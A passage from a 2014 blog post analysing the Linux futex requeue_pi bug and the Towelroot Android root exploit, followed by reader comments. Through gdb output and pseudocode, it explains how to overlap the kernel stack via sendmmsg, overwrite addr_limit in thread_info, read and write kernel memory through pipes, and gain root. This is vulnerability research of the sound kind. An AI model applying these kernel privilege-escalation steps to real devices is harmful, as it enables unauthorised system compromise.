(gdb) print &amp;hb
$9 = (struct futex_hash_bucket **) 0xd801ddf8
(gdb) print &amp;q
$10 = (struct futex_q *) 0xd801de78
</pre>
<p>In the linux kernel source dode, there is a very convenient script that can measure stack usage of functions, unfortunately this doesn’t work very well on ARM, but here is an example output in i386.</p>
<pre class="wp-block-preformatted">objdump -d vmlinux | ./scripts/checkstack.pl


...
0xc10ff286 core_sys_select [vmlinux]:			296
0xc10ff4ac core_sys_select [vmlinux]:			296
...
0xc106a236 futex_wait_requeue_pi.constprop.21 [vmlinux]:212
0xc106a380 futex_wait_requeue_pi.constprop.21 [vmlinux]:212
...
0xc14a406b sys_recvfrom [vmlinux]:			180
0xc14a4165 sys_recvfrom [vmlinux]:			180
0xc14a4438 __sys_sendmmsg [vmlinux]:			180
0xc14a4524 __sys_sendmmsg [vmlinux]:			180
...
</pre>
<p>The numbers on the right shows the maximum stack usage that was accessed by that function. The <code>rt_waiter</code> is not the last variable on stack, so we don’t really need to go deeper than 212. The deeper the stack, the lower address value will be used, in our case, we can ignore the <code>hashbucket</code>, <code>key2</code>, <code>q</code>, that totals in 64 bytes. Any syscall that has a stack use of more than 212-64 is a candidate.</p>
<p>Learning from geohot’s exploit, he found that there are four very convenient functions that can be used, this is the fist value in towelroot modstring, <code>sendmmsg</code>, <code>recvmmsg</code>, <code>sendmsg</code>, and <code>recvmsg</code> (each corresponds to method 0-3 in his towelroot modstring).</p>
<p>Knowing the address of <code>rt_waiter</code>, lets see the kernel stack when towelroot calls <code>sys_sendmmsg</code> and look at the <code>iovstack</code> array.</p>
<pre class="wp-block-preformatted">(gdb) print &amp;iovstack[0]
$17 = (struct iovec *) 0xd801ddf0
(gdb) print &amp;iovstack[1]
$18 = (struct iovec *) 0xd801ddf8
(gdb) print &amp;iovstack[2]
$19 = (struct iovec *) 0xd801de00
(gdb) print &amp;iovstack[3]
$20 = (struct iovec *) 0xd801de08
(gdb) print &amp;iovstack[4]
$21 = (struct iovec *) 0xd801de10
</pre>
<p>Look at that, the <code>iovstack[4]</code> is in the same address as <code>rt_waiter</code></p>
<pre class="wp-block-preformatted">(gdb) print iovstack
$22 = {{iov_base = 0xa0000800, iov_len = 125}, {iov_base = 0xa0000800, iov_len = 125}, {iov_base = 0xa0000800, iov_len = 125}, {
    iov_base = 0xa0000800, iov_len = 125}, {iov_base = 0xa0000800, iov_len = 1050624}, {iov_base = 0xa0000800, iov_len = 125}, {
    iov_base = 0xa0000800, iov_len = 125}, {iov_base = 0xa0000800, iov_len = 125}}
</pre>
<p>And now lets see the <code>iov</code> as struct <code>rt_mutex_waiter</code></p>
<pre class="wp-block-preformatted">(gdb) print *(struct rt_mutex_waiter*)&amp;iovstack[4]
$23 = {list_entry = {prio = -1610610688, prio_list = {next = 0x100800, prev = 0xa0000800}, node_list = {next = 0x7d, prev = 0xa0000800}},
  pi_list_entry = {prio = 125, prio_list = {next = 0xa0000800, prev = 0x7d}, node_list = {next = 0xa0000800, prev = 0xa0000800}},
  task = 0xa0000800, lock = 0xa0000800}
</pre>
<p>Of course this function can return immediately when the data is received on the other side. So what towelroot do is this: create a thread that will accept a connection in localhost, after it <code>accept()s</code> it, it never reads the data, so the <code>sendmmsg</code> call will be just hanging there waiting for the data to be sent. So the receiver thread looks like this:</p>
<pre class="wp-block-preformatted">bind()
listen()
while (1) {
      s = accept();
      log("i have a client like hookers");
}
</pre>
<p>As you can see in the simplest list example, that a compiler optimization can cause the address to change slightly, so the other parameter in the modstring is the <code>hit_iov</code>, so in the towelroot code, it looks something like this:</p>
<pre class="wp-block-preformatted">for (i =0 ;i &lt; 8; i++) {<br>  iov[i].iov_base = (void *)0xa0000800;<br>  iov[i].iov_len = 0x7d;<br>  if (i==TARGET_IOV) {<br>     iov[i].iov_len = 0x100800;<br>  }<br>}</pre>
<p>The other parameter related to iov is the align. I am not completely sure about this and when this is needed. From my observation, it sets all <code>iov_len</code> to 0x100800.</p>
<p>On the other thread, basically what towelroot does is this:</p>
<pre class="wp-block-preformatted">void sender_thread(){<br> setpriority(N);<br> connect(to_the_listener);<br> futex_wait_requeue_pi(...);<br> sendmmsg(...) ;<br>}</pre>
<p>Unfortunately, having multi core can ruin things, so to make things safe, before starting, towelroot will set the process affinity so that this process will be run on only one core.</p>
<p>The detail of manipulating the waiter priority list is left to the reader (the objective is to write to a memory address) , but I can give you some pointers: to add a new waiter, use FUTEX_LOCK_PI, and to control where the item will be put, call <code>setpriority</code> prior to waiting. The baseline value is 120 (for nice value 0), so if you set priority 12 using <code>setpriority</code>, you will see the priority as 132 in the kernel land. The total line of <code>plist.h</code> and <code>plist.c</code> is only around 500 lines, and you only need to go to detail for <code>plist_add</code> and <code>plist_del</code>. Depending on what we want to overwrite, we don’t even need to be able to set to a specific value.</p>
<p>To modify the list, you will need multiple threads with different priorities. To be sure that the threads you started is really waiting inside a syscall (there will be time from creating the thread calling the syscall until it waits inside the syscall), you can use the trick that is used by towelroot: it reads the <code>/proc/PID/task/TID/status</code> of the Task with TID that you want to check. When the process is inside a syscall, the <code>voluntary_ctxt_switches</code> will keep on increasing (and the <code>nonvoluntary_ctxt_switches</code> will stay, but towelroot doesn’t check this). A voluntary context switch happens when a task is waiting inside a syscall.</p>
<p>Usually what people do when exploiting the kernel is to write to a function pointer. We can get the location of where these pointers are stored from reading <code>/proc/kallsysms</code>, or by looking at <code>System.map</code> generated when compiling the kernel. Both is usually not (easily) available in latest Android (<a href="https://www.duosecurity.com/blog/exploit-mitigations-in-android-jelly-bean-4-1">this is one of the security mitigations introduced in Android 4.1</a>). You may be able to get the address by recompiling an exact same kernel image using the same compiler and kernel configuration. On most PC distributions, you can find the symbols easily (via System.map and <code>/proc/kallsyms</code> is not restricted.</p>
<p>Assume that you can somehow get the address of a function pointer to overwrite, we can write a function that sets the current process credential to have root access and redirect so that our function is called instead of the original. But there is another way to change the process credential without writing any code that runs in kernel mode, just by writing to kernel memory. You can read the full <a href="https://jon.oberheide.org/files/stackjacking-infiltrate11.pdf">presentation here</a>, in the next part, I will only discuss the part needed to implement the exploit.</p>
<h3>The Kernel Stack</h3>
<p>Every thread is assigned a kernel stack space, and part of the stack space contains <a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/thread_info.h?v=3.14#L60">thread_info</a> for that task. The stack address is different for every thread (the size is 8KB/thread in ARM) and you can not predict the address. So there will be a bunch of 8 KB stack blocks allocated for every thread. The <code>thread_info</code> is stored in the stack, in the lower address (stacks begins from top/high address). This <code>thread_info</code> contains information such as the pointer to <a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=3.14#L1163">task_struct</a>. Inside a syscall, the <code>task_struct</code> for current thread is accessible by using the <a href="http://lxr.free-electrons.com/source/include/asm-generic/current.h?v=3.14#L7"><code>current</code> macro</a>:</p>
<pre class="wp-block-preformatted">#define get_current() (current_thread_info()-&gt;task)<br>#define current get_current()</pre>
<p>In ARM, <a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/thread_info.h?v=3.14#L107">current_thread_info() is defined as</a>:</p>
<pre class="wp-block-preformatted">#define THREAD_SIZE             8192<br>static inline struct thread_info *current_thread_info(void){<br> register unsigned long sp asm ("sp");<br> return (struct thread_info *)(sp &amp; ~(THREAD_SIZE - 1));<br>}</pre>
<p>Or if you want a constant number, the <code>thread_info</code> is located here $sp &amp; 0xffffe000. Here is an example of task info when I am inside a syscall:</p>
<pre class="wp-block-preformatted">(gdb) print  *((struct thread_info*)(((uint32_t)$sp &amp; 0xffffe000)))
$23 = {flags = 0, preempt_count = 0, addr_limit = 3204448256, task = 0xd839d000, exec_domain = 0xc047e9ec, cpu = 0, cpu_domain = 21, cpu_context = {
    r4 = 3626094784, r5 = 3627667456, r6 = 3225947936, r7 = 3626094784, r8 = 3561353216, r9 = 3563364352, sl = 3563364352, fp = 3563372460, 
    sp = 3563372408, pc = 3224755408, extra = {0, 0}}, syscall = 0, used_cp = "\000\000\000\000\000\000\000\000\000\000\001\001\000\000\000", 
  tp_value = 3066633984, crunchstate = {mvdx = {{0, 0} }, mvax = {{0, 0, 0}, {0, 0, 0}, {0, 0, 0}, {0, 0, 0}}, dspsc = {0, 0}}, 
  fpstate = {hard = {save = {0 }}, soft = {save = {0 }}}, vfpstate = {hard = {fpregs = {334529072224223236, 0, 
        0, 0, 0, 4740737484919406592, 4562254508917369340, 4724999426224703930, 0 }, fpexc = 1073741824, fpscr = 16, 
      fpinst = 3725516880, fpinst2 = 2816}}, restart_block = {fn = 0xc0028ca8 , {futex = {uaddr = 0x0, val = 0, flags = 0, 
        bitset = 0, time = 0, uaddr2 = 0x0}, nanosleep = {clockid = 0, rmtp = 0x0, expires = 0}, poll = {ufds = 0x0, nfds = 0, has_timeout = 0, 
        tv_sec = 0, tv_nsec = 0}}}}
</pre>
<p>Before continuing, you need to get a feeling of the memory mapping. <a href="http://www.arm.linux.org.uk/developer/memory.txt">This document</a> doesn’t help much, but it gives an idea. Since every kernel can be compiled to have a different mapping, lets assume a common mapping for 32 bit ARM kernel:</p>
<ul><li>a very low memory address (0x0-0x1000) is restricted for mapping (<a href="https://wiki.debian.org/mmap_min_addr">for security purpose</a>)</li><li>address 0x1000-0xbf000000 is the user space</li><li>around 0xc0000000- 0xcffffff is where the kernel code location</li><li>area around 0xdxxxxxxx-0xfefffffe is where the kernel data is (stack and heap)</li><li>high memory ranges (0xfeffffff-0xffffffff) is reserved by the kernel.</li></ul>
<p>The <code>addr_limit</code> is a nice target for overwrite. The default value for ARM is 3204448256 (0xbf000000), this value is checked in every operation in kernel that copy values from and to user space. You can read more about this in this post (<a href="https://xorl.wordpress.com/2010/10/25/linux-kernel-user-to-kernel-space-range-checks/">Linux kernel user to kernel space range checks</a>). The <code>addr_limit</code> is per task (every <code>thread_info</code> can have a different limit).</p>
<p>Area below <code>addr_limit</code> is considered to be a valid memory space that user space process can pass to kernel as parameter. Just to be clear here: if we modify <code>addr_limit</code>, it doesn’t mean that the user space can suddenly access memory at kernel space (for example, you can’t just dereference an absolute memory like this: <code>*(uint32_t*)0xc0000000</code> to access kernel space from user space). The kernel can always read all the memory, so what this limit does is to make sure that when a user space gives a parameter to a syscall, the address given must be in user space. For example, kernel will not allow <code>write(fd, addr, len)</code> if <code>addr</code> is above <code>addr_limit</code>.</p>
<p>If we can somehow increase this limit, we can then read and modify kernel structures (using read/write syscall). Using a list manipulation, we can overwrite an address, and the location of <code>addr_limit</code> the one we want to overwrite.</p>
<p>Once we overwrite the <code>addr_limit</code> (in arm it is located at offset 8 in <code>thread_info</code> after <code>flags</code> and <code>preempt_count</code>), we can then (from userspace) read the address of the <code>task_struct</code> field, then from there, read the address of our credential (<code>cred</code>) field, then write/set our uid/gid to 0, and spawn a root shell (or do anything that you like, for example: just chown root/chmod suid certain file).</p>
<h3>Kernel stack location</h3>
<p>So basically we have two problems here: how to find the address to overwrite, and how to overwrite it. The part about “how to overwrite” is done by the list manipulation. The part about finding the address to overwrite: use other kernel vulnerability to leak kernel memory. There are a lot of bugs in the Linux kernel where it leaks memory to userspace (<a href="https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/opginf-1/Linux-Linux-Kernel.html">here is all of them in that category</a>, there are 26 this year, and 194 in total), not all of these bugs can be used to leak the location of the stack.</p>
<p>Because the thread_info is always located at the beginning of stack, we can always find it if we know any address that is located in the stack, (just use <code>addr &amp; 0xffffe000</code>). So we don’t really care about the exact leaked address. In the kernel space, there are a lot of code where a stack variable points to another variable. Just for an example, here is a code in futex.c that does this:</p>
<pre class="wp-block-preformatted">q.rt_waiter = &amp;rt_waiter;<br>q.requeue_pi_key = &amp;key2;</pre>
<p>Both <code>rt_waiter</code> and <code>key2</code> are located in the stack. If there is a code in the kernel that copies data to user space from uninitialized data on stack it, then will use whatever previous values that was on that stack, this is what we call an information leak. For a specific kernel version with a specific compiler we can get a reliable address, but with different kernel version and different compiler version (and optimization), most of the time this is not very reliable (it really depends on the previous usage of the stack and the stack layout created by the compiler). We can check for the leaked value, if we see a value above the <code>addr_limit</code>, what we get is a possible stack location.</p>
<p><del datetime="2014-07-17T12:56:36+00:00">Towelroot uses <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2141">CVE-2013-2141</a> which is still in most Android kernel. You can check your kernel if it is affected by looking at <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f">the patch that corresponds to that bug</a> (just check if info is initialized like this: <code>struct siginfo info = {}</code>). You can experiment a little bit to get a (mostly) reliable kernel stack address leak. This is the value that is printed by towelroot (“xxxx is a good number”). Please note that this is not 100% reliable, so sometimes towelroot will try to modify invalid address (it doesn’t seem to check if the address is above bf000000). Lets say we find the (possible) memory and name this POSSIBLE_STACK from now on.</del></p>
<p>Update: I was wrong, towelroot uses the stack address from the unlinked waiter address. The waiter is unlinked because of the tgkill() call. So the address should always be valid.</p>
<h3>Overwrite</h3>
<p>Ideally we want to be able to read the whole kernel space, but we can start small, increase our limit a little bit. You may have noticed several things by now: the <code>rt_waiter</code> is stored in the stack (lets say in location X), the <code>addr_limit</code> is also stored in stack (lets say Y), the X location is going to be always greater than Y for that thread. We know that the thread_info is always located at sp &amp; 0xffffe000, so we have POSSIBLE_THREAD_INFO = (POSSIBLE_STACK &amp; 0xffffe000). So if we can put the address of any <code>rt_waiter</code> from other tasks and write it to (POSSIBLE_THREAD_INFO + 8), we have increased the stack limit from bf000000 to some value (usually dxxxxxxx).</p>
<p>I am not entirely sure (since I don’t have a samsung S5), but it seems that the <code>addr_limit</code> is not always in offset 8, so towelroot have <code>limit_offset</code> to fix the address.</p>
<p>How to know if we have succesfully changed the address limit for a task? From inside that task, we can use the <code>write</code> syscall. For example, we can try: <code>write(fd, (void *)0xc0000000, 4) </code>. What we are trying to do is to write the content of the memory address to a file descriptor (you can replace 0xc000000 with any address above 0xbf000000). If we can do this successfuly, then we can continue because our limit has been changed.</p>
<p>On my experiment, the memory leak is sometimes very predictable (it leaks always a certain task kernel address, but not always). If we know exactly which thread address we modify, we can ask that thread to continue our work, otherwise, we need to ask all the threads that we have (for example by sending a signal): <em>can you check if the address limit have been changed for you?</em> If a thread can read the kernel memory address, then we know the address of that thread’s <code>thread_info</code>, we can then read and write to POSSIBLE_THREAD_INFO + 8. First thing that we want to do is to change *(POSSIBLE_THREAD_INFO + 8) = 0xffffffff. Now this thread can read and write to anywhere.</p>
<p>Here is an example where a thread’s addr_limit has been successfully changed to 0xffffffff:</p>
<pre class="wp-block-preformatted">(gdb) print  *((struct thread_info*)(((uint32_t)$sp &amp; 0xffffe000)))
$22 = {flags = 0, preempt_count = 0, addr_limit = 4294967295, task = 0xd45d6000, exec_domain = 0xc047e9ec, cpu = 0, cpu_domain = 21, cpu_context = {
    r4 = 3561369728, r5 = 3562889216, r6 = 3225947936, r7 = 3561369728, r8 = 3562677248, r9 = 3069088276, sl = 3561955328, fp = 3561963004, 
    sp = 3561962952, pc = 3224755408, extra = {0, 0}}, syscall = 0, used_cp = "\000\000\000\000\000\000\000\000\000\000\001\001\000\000\000", 
  tp_value = 3061055232, crunchstate = {mvdx = {{0, 0} }, mvax = {{0, 0, 0}, {0, 0, 0}, {0, 0, 0}, {0, 0, 0}}, dspsc = {0, 0}}, 
  fpstate = {hard = {save = {0 }}, soft = {save = {0 }}}, vfpstate = {hard = {fpregs = {1067681969331808106, 0, 
        0, 0, 0, 4738224773140578304, 4562254508917369340, 4732617274506747052, 0 }, fpexc = 1073741824, fpscr = 16, 
      fpinst = 3725475920, fpinst2 = 2816}}, restart_block = {fn = 0xc0028ca8 , {futex = {uaddr = 0x0, val = 0, flags = 0, 
        bitset = 0, time = 0, uaddr2 = 0x0}, nanosleep = {clockid = 0, rmtp = 0x0, expires = 0}, poll = {ufds = 0x0, nfds = 0, has_timeout = 0, 
        tv_sec = 0, tv_nsec = 0}}}}
</pre>
<p>Once you can read/write anywhere, you can do anything, its game over. First you may want to fix the plist so that it will not crash (something that was not done by towelroot v1), although sometimes in towelroot v3, it stops because it was unable to fix the list even though it can do the rooting process. Even though you can read/write using file, to make it easy you can use <code>pipe</code>, and write/read to/from that pipe.</p>
<p>If we have a pipe, with <code>rfd</code> as read descriptor in the side of the pipe and <code>wfd</code> as the write descriptor, we can do this: To read a memory from kernel: do a <code>write(wfd, KERNEL_ADDR, size)</code>, and read the result in <code>read(rfd, LOCAL_ADDRESS, size)</code>. To write to kernel memory: do a <code>write(wfd, LOCAL_ADDRESS, size)</code>, and then <code>read(rfd, KERNEL_ADDRESS, size)</code>.</p>
<p>If you want to play around without creating exploit, you can also try out the <code>addr_limit</code> by setting the value manually in your debugger.</p>
<p>The last modstring in towelroot is <code>temp_root</code> which is not related to the exploit itself, it only creates temporary root for devices that have non writeable /system.</p>
<p>So thats all there is to it. I have shown you where the bug is, which syscall that you can use to manipulate the stack, how to write to arbitrary address (although not in detail, but with enough pointers), what to write there, and what to do after you write there.</p>
</div>
<footer class="entry-footer">
<span class="byline"><span class="author vcard"><img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/75aabd4eafd732c17362303b79836fa2.jpeg" srcset="https://secure.gravatar.com/avatar/75aabd4eafd732c17362303b79836fa2?s=98&amp;d=mm&amp;r=g 2x" class="avatar avatar-49 photo" height="49" width="49" loading="lazy"><span class="screen-reader-text">Author </span> <a class="url fn n" href="https://tinyhack.com/author/admin/">admin</a></span></span><span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/" rel="bookmark"><time class="entry-date published" datetime="2014-07-07T02:23:37+00:00">July 7, 2014</time><time class="updated" datetime="2018-11-21T02:24:01+00:00">November 21, 2018</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="https://tinyhack.com/category/hacks/" rel="category tag">hacks</a>, <a href="https://tinyhack.com/category/linux/" rel="category tag">linux</a>, <a href="https://tinyhack.com/category/security/" rel="category tag">security</a></span> </footer>
</article>
<div id="comments" class="comments-area">
<h2 class="comments-title">
9 thoughts on “Exploiting the Futex Bug and uncovering Towelroot” </h2>
<ol class="comment-list">
<li id="comment-27365" class="comment even thread-even depth-1">
<article id="div-comment-27365" class="comment-body">
<footer class="comment-meta">
<div class="comment-author vcard">
 <img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/37ab1fb0311b62391dd89c6a7ba89fd3.png" srcset="https://secure.gravatar.com/avatar/37ab1fb0311b62391dd89c6a7ba89fd3?s=84&amp;d=mm&amp;r=g 2x" class="avatar avatar-42 photo" height="42" width="42" loading="lazy"> <b class="fn"><a href="http://none/" rel="external nofollow ugc" class="url">alan czarnecki</a></b> <span class="says">says:</span> </div>
<div class="comment-metadata">
<a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#comment-27365"><time datetime="2014-07-07T14:26:09+00:00">July 7, 2014 at 2:26 pm</time></a> </div>
</footer>
<div class="comment-content">
<p>Hello – Looks to me like a typo in main():</p>
<p>int main()<br>
{<br>
foo(1, 10); //set to 10<br>
foo(0, 0); //print it<br>
bar(1, 12); //set to 12<br>
foo(0, 0); //print foo again</p>
<p> return 0;<br>
}</p>
<p>should be:</p>
<p>int main()<br>
{<br>
foo(1, 10); //set to 10<br>
foo(0, 0); //print it<br>
bar(1, 12); //set to 12<br>
bar(0, 0); //print bar &lt;======*****</p>
<p> return 0;<br>
}</p>
<p>no?<br>
Regards,<br>
alan</p>
</div>
<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/?replytocom=27365#respond" data-commentid="27365" data-postid="304" data-belowelement="div-comment-27365" data-respondelement="respond" data-replyto="Reply to alan czarnecki" aria-label="Reply to alan czarnecki">Reply</a></div> </article>
</li>
<li id="comment-27366" class="comment odd alt thread-odd thread-alt depth-1">
<article id="div-comment-27366" class="comment-body">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/37ab1fb0311b62391dd89c6a7ba89fd3.png" srcset="https://secure.gravatar.com/avatar/37ab1fb0311b62391dd89c6a7ba89fd3?s=84&amp;d=mm&amp;r=g 2x" class="avatar avatar-42 photo" height="42" width="42" loading="lazy"> <b class="fn"><a href="http://none/" rel="external nofollow ugc" class="url">alan czarnecki</a></b> <span class="says">says:</span> </div>
<div class="comment-metadata">
<a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#comment-27366"><time datetime="2014-07-07T14:29:37+00:00">July 7, 2014 at 2:29 pm</time></a> </div>
</footer>
<div class="comment-content">
<p>nvm – finally read your words :</p>
<p>Both local uses the same stack location. When bar is called, it writes to the same stack location used by “foo” for its local variable. This simple concept will play a role in understanding the bug. </p>
<p>apologies for bugging you – going to get more coffee before reading further</p>
</div>
<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/?replytocom=27366#respond" data-commentid="27366" data-postid="304" data-belowelement="div-comment-27366" data-respondelement="respond" data-replyto="Reply to alan czarnecki" aria-label="Reply to alan czarnecki">Reply</a></div> </article>
</li>
<li id="comment-27385" class="comment even thread-even depth-1">
<article id="div-comment-27385" class="comment-body">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/e9885dc1f9e66e26dfcb0689cdc468af.png" srcset="https://secure.gravatar.com/avatar/e9885dc1f9e66e26dfcb0689cdc468af?s=84&amp;d=mm&amp;r=g 2x" class="avatar avatar-42 photo" height="42" width="42" loading="lazy"> <b class="fn">ELB</b> <span class="says">says:</span> </div>
<div class="comment-metadata">
<a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#comment-27385"><time datetime="2014-07-08T06:54:07+00:00">July 8, 2014 at 6:54 am</time></a> </div>
</footer>
<div class="comment-content">
<p>Dude first of all i would love to say thank you! this is the first decent info i’ve found about the bug, and next how about some contact info maybe irc or mail?</p>
</div>
<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/?replytocom=27385#respond" data-commentid="27385" data-postid="304" data-belowelement="div-comment-27385" data-respondelement="respond" data-replyto="Reply to ELB" aria-label="Reply to ELB">Reply</a></div> </article>
</li>
<li id="comment-27424" class="comment odd alt thread-odd thread-alt depth-1">
<article id="div-comment-27424" class="comment-body">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/e89c7c0e7c278855cc409e73201f9b6f.png" srcset="https://secure.gravatar.com/avatar/e89c7c0e7c278855cc409e73201f9b6f?s=84&amp;d=mm&amp;r=g 2x" class="avatar avatar-42 photo" height="42" width="42" loading="lazy"> <b class="fn">solidwrench</b> <span class="says">says:</span> </div>
<div class="comment-metadata">
<a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#comment-27424"><time datetime="2014-07-08T22:49:22+00:00">July 8, 2014 at 10:49 pm</time></a> </div>
</footer>
<div class="comment-content">
<p>I have some questions, mostly regarding the futex code. futexes are new to me.</p>
<p>1. Where is the list where rt_waiter is saved? what is this “waiter list”? I’m assuming this isn’t the futex_q list since q.rt_waiter is set to NULL.<br>
2. This seems to only happen when requeue_pi = 1 in futex_requeue(), judging from patches &amp; the code path you mention. is this true?<br>
3. I probably have more, thanks in advance <img draggable="false" role="img" class="emoji" alt="🙂" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/1f642.svg"></p>
</div>
<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/?replytocom=27424#respond" data-commentid="27424" data-postid="304" data-belowelement="div-comment-27424" data-respondelement="respond" data-replyto="Reply to solidwrench" aria-label="Reply to solidwrench">Reply</a></div> </article>
</li>
<li id="comment-27452" class="comment even thread-even depth-1">
<article id="div-comment-27452" class="comment-body">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/e89c7c0e7c278855cc409e73201f9b6f.png" srcset="https://secure.gravatar.com/avatar/e89c7c0e7c278855cc409e73201f9b6f?s=84&amp;d=mm&amp;r=g 2x" class="avatar avatar-42 photo" height="42" width="42" loading="lazy"> <b class="fn">solidwrench</b> <span class="says">says:</span> </div>
<div class="comment-metadata">
<a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#comment-27452"><time datetime="2014-07-09T07:49:46+00:00">July 9, 2014 at 7:49 am</time></a> </div>
</footer>
<div class="comment-content">
<p>ignore my previous comment, I think I figured it out. rt_waiter gets added to an external list via a rt_mutex_start_proxy_lock() call in futex_requeue().</p>
</div>
<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/?replytocom=27452#respond" data-commentid="27452" data-postid="304" data-belowelement="div-comment-27452" data-respondelement="respond" data-replyto="Reply to solidwrench" aria-label="Reply to solidwrench">Reply</a></div> </article>
</li>
<li id="comment-27611" class="comment odd alt thread-odd thread-alt depth-1">
<article id="div-comment-27611" class="comment-body">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" src="./2014 - Exploiting the Futex Bug and uncovering Towelroot_files/e89c7c0e7c278855cc409e73201f9b6f.png" srcset="https://secure.gravatar.com/avatar/e89c7c0e7c278855cc409e73201f9b6f?s=84&amp;d=mm&amp;r=g 2x" class="avatar avatar-42 photo" height="42" width="42" loading="lazy"> <b class="fn">solidwrench</b> <span class="says">says:</span> </div>
<div class="comment-metadata">
<a href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#comment-27611"><time datetime="2014-07-11T19:38:53+00:00">July 11, 2014 at 7:38 pm</time></a> </div>
</footer>
<div class="comment-content">
<p>Hello, I’m still trying to rewrite the exploit. The problem I currently have is the pi_state member in futex_q. futex_requeue assigns it to each requeued futex. It bails if you try to give it a futex with a pi_state, preventing re-requeueing. I wrote a post about it here: <a href="https://solidwrench.blogspot.com/2014/07/playing-with-futexrequeue-bug.html" rel="nofollow ugc">http://solidwrench.blogspot.com/2014/07/playing-with-futexrequeue-bug.html</a></p>
</div>
<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/?replytocom=27611#respond" data-commentid="27611" data-postid="304" data-belowelement="div-comment-27611" data-respondelement="respond" data-replyto="Reply to solidwrench" aria-label="Reply to solidwrench">Reply</a></div> </article>
</li>
<li id="comment-48213" class="pingback even thread-even depth-1">
<div class="comment-body">
Pingback: <a href="http://nikolay.tereshchenko.pro/2016/05/04/360085" rel="external nofollow ugc" class="url">Злоумышленники используют набор эксплойтов для кибератак на пользователей Android - Терещенко. Просто. Профессионально</a> </div>
</li>
<li id="comment-50018" class="pingback odd alt thread-odd thread-alt depth-1">
<div class="comment-body">
Pingback: <a href="https://www.nowsecure.com/blog/2015/01/26/samsung-account-and-galaxy-apps-technical-breakdown-cve-2015-0863-and-cve-2015-0864/" rel="external nofollow ugc" class="url">Samsung Account and GALAXY Apps Technical Breakdown - CVE-2015-0863 and CVE-2015-0864 - NowSecure - The Mobile Security Technology Company</a> </div>
</li>
<li id="comment-66255" class="pingback even thread-even depth-1">
<div class="comment-body">
Pingback: <a href="https://cintaprogramming.com/2018/10/02/membaca-source-code/" rel="external nofollow ugc" class="url">Membaca Source Code – Cinta Programming</a> </div>
</li>
</ol>
<div id="respond" class="comment-respond">
<h2 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/#respond" style="display:none;">Cancel reply</a></small></h2><form action="https://tinyhack.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate=""><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment-5f68f6698dc29" cols="45" rows="8" maxlength="65525" required="required"></textarea><textarea name="comment" rows="1" cols="1" style="display:none"></textarea></p><input type="hidden" name="comment-replaced" value="true"><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required="required"></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required="required"></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200"></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="304" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
